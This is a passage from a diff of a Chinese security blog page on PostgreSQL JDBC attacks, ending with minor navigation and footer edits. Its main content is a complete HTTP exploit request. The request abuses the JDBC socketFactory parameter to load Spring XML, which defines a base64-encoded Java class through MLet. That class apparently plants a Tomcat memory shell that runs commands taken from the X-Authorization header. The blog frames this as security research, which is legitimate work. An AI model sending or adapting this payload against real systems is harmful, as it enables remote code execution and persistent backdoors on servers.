 <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/jdbc?url=jdbc:postgresql:///test/?a=&amp;url=%26socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext%26socketFactoryArg=file://%24%7bcatalina.home%7d/**/*.tmp</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.111.1:8080</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">X-Authorization</span><span class="punctuation">: </span>whoami</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryIg9FMRJD9ScjO8dH</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>135</span><br><span class="line"></span><br><span class="line"><span class="language-bash">------WebKitFormBoundaryIg9FMRJD9ScjO8dH</span></span><br><span class="line"><span class="language-bash">Content-Disposition: form-data; name=<span class="string">&quot;1&quot;</span></span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">&lt;beans xmlns=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="language-bash">       xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="language-bash">       xsi:schemaLocation=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="language-bash">                           http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;decoder&quot;</span> class=<span class="string">&quot;org.springframework.beans.factory.config.MethodInvokingFactoryBean&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;property name=<span class="string">&quot;staticMethod&quot;</span> value=<span class="string">&quot;javax.xml.bind.DatatypeConverter.parseBase64Binary&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;property name=<span class="string">&quot;arguments&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">            &lt;list&gt;</span></span><br><span class="line"><span class="language-bash">                &lt;value&gt;yv66vgAAADIBOwEAXm9yZy9hcGFjaGUvY29tbW9tcy9iZWFudXRpbHMvY295b3RlL2ludHJvc3BlY3QvQW5ub3RhdGVkTWVtYmVyMjA5ZjAxMzVmYzM5NDY2ZDg0ZWY3NWZlODA2YmZjYjgHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQATamF2YS9sYW5nL0V4Y2VwdGlvbgcABwwABQAGCgAEAAkBAANydW4MAAsABgoAAgAMAQAQZ2V0UmVxSGVhZGVyTmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAPWC1BdXRob3JpemF0aW9uCAAQAQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uBwASAQATamF2YS9sYW5nL1Rocm93YWJsZQcAFAEAEGphdmEvbGFuZy9UaHJlYWQHABYBAApnZXRUaHJlYWRzCAAYAQAPamF2YS9sYW5nL0NsYXNzBwAaAQASW0xqYXZhL2xhbmcvQ2xhc3M7BwAcAQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7DAAeAB8KABsAIAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAcAIgEADXNldEFjY2Vzc2libGUBAAQoWilWDAAkACUKACMAJgEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwwAKAApCgAjACoBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwAsAQAHZ2V0TmFtZQwALgAPCgAXAC8BAARodHRwCAAxAQAQamF2YS9sYW5nL1N0cmluZwcAMwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaDAA1ADYKADQANwEACEFjY2VwdG9yCAA5AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7DAA7ADwKAAQAPQEABnRhcmdldAgAPwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMAEEAQgoAGwBDAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHAEUKAEYAJgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7DABIAEkKAEYASgEACGVuZHBvaW50CABMAQAGdGhpcyQwCABOAQAHaGFuZGxlcggAUAEADWdldFN1cGVyY2xhc3MMAFIAPAoAGwBTAQAGZ2xvYmFsCABVAQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7DABXAFgKABsAWQEAIm9yZy5hcGFjaGUuY295b3RlLlJlcXVlc3RHcm91cEluZm8IAFsBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIHAF0BAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7DABfAGAKAF4AYQoAGwAvAQAKcHJvY2Vzc29ycwgAZAEAE2phdmEvdXRpbC9BcnJheUxpc3QHAGYBAARzaXplAQADKClJDABoAGkKAGcAagEAFShJKUxqYXZhL2xhbmcvT2JqZWN0OwwASABsCgBnAG0BAANyZXEIAG8BAAdnZXROb3RlCABxAQARamF2YS9sYW5nL0ludGVnZXIHAHMBAARUWVBFAQARTGphdmEvbGFuZy9DbGFzczsMAHUAdgkAdAB3AQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsMAHkAegoAdAB7AQAJZ2V0SGVhZGVyCAB9AQAJZ2V0TWV0aG9kDAB/AB8KABsAgAwADgAPCgACAIIBAAtnZXRSZXNwb25zZQgAhAEACWdldFdyaXRlcggAhgEADmphdmEvaW8vV3JpdGVyBwCIAQAGaGFuZGxlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsMAIoAiwoAAgCMAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYMAI4AjwoAiQCQAQAFZmx1c2gMAJIABgoAiQCTAQAFY2xvc2UMAJUABgoAiQCWAQAEZXhlYwEAB29zLm5hbWUIAJkBABBqYXZhL2xhbmcvU3lzdGVtBwCbAQALZ2V0UHJvcGVydHkMAJ0AiwoAnACeAQALdG9Mb3dlckNhc2UMAKAADwoANAChAQADd2luCACjAQAHL2Jpbi9zaAgApQEAAi1jCACnAQAHY21kLmV4ZQgAqQEAAi9jCACrAQARamF2YS9sYW5nL1J1bnRpbWUHAK0BAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DACvALAKAK4AsQEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsMAJgAswoArgC0AQARamF2YS9sYW5nL1Byb2Nlc3MHALYBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07DAC4ALkKALcAugEAEWphdmEvdXRpbC9TY2FubmVyBwC8AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWDAAFAL4KAL0AvwEAAlxhCADBAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7DADDAMQKAL0AxQEAAAgAxwEAB2hhc05leHQBAAMoKVoMAMkAygoAvQDLAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIHAM0KAM4ACQEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwwA0ADRCgDOANIBAARuZXh0DADUAA8KAL0A1QEACHRvU3RyaW5nDADXAA8KAM4A2AEACmdldE1lc3NhZ2UMANoADwoACADbAQATW0xqYXZhL2xhbmcvU3RyaW5nOwcA3QEAE2phdmEvaW8vSW5wdXRTdHJlYW0HAN8BAAZleUplWEEIAOEBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaDADjAOQKADQA5QEABmxlbmd0aAwA5wBpCgA0AOgBAAZjaGFyQXQBAAQoSSlDDADqAOsKADQA7AEAFShDKUxqYXZhL2xhbmcvU3RyaW5nOwwAeQDuCgA0AO8BAAhwYXJzZUludAEAFShMamF2YS9sYW5nL1N0cmluZzspSQwA8QDyCgB0APMBAAEuCAD1AQAHaW5kZXhPZgwA9wDyCgA0APgBAAlzdWJzdHJpbmcBABYoSUkpTGphdmEvbGFuZy9TdHJp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&lt;/value&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">            &lt;/list&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">        &lt;/property&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;/bean&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;classLoader&quot;</span> class=<span class="string">&quot;javax.management.loading.MLet&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;bean <span class="built_in">id</span>=<span class="string">&quot;clazz&quot;</span> factory-bean=<span class="string">&quot;classLoader&quot;</span> factory-method=<span class="string">&quot;defineClass&quot;</span>&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg ref=<span class="string">&quot;decoder&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span> value=<span class="string">&quot;0&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">        &lt;constructor-arg <span class="built_in">type</span>=<span class="string">&quot;int&quot;</span> value=<span class="string">&quot;5133&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">    &lt;/bean&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">    &lt;bean factory-bean=<span class="string">&quot;clazz&quot;</span> factory-method=<span class="string">&quot;newInstance&quot;</span>/&gt;</span></span><br><span class="line"><span class="language-bash">&lt;/beans&gt;</span></span><br><span class="line"><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">------WebKitFormBoundaryIg9FMRJD9ScjO8dH--</span></span><br><span class="line"><span class="language-bash"></span></span><br></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805740023-02a1d8b8-6fa3-4462-868a-c556fb317da4.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1752805740023-02a1d8b8-6fa3-4462-868a-c556fb317da4.png" alt="PostgreSQL-JDBC-Attack" loading="lazy"></p>
 
       </div>
       
@@ -292,13 +313,13 @@ Mysql的套娃，需要有mysql-connector-java（<font style="color:rgb(0, 0, 0)
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/08/14/%E5%9F%BA%E4%BA%8ESqlServer%E7%9A%84SQL%E6%B3%A8%E5%85%A5/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>基于SqlServer的SQL注入</strong>
       </a>
     
     
-      <a href="/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/08/06/Spring%E5%86%85%E5%AD%98%E9%A9%AC/">
+        <span>更早一篇</span>
         <strong>Spring内存马</strong>
       </a>
     
@@ -312,9 +333,9 @@ Mysql的套娃，需要有mysql-connector-java（<font style="color:rgb(0, 0, 0)
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
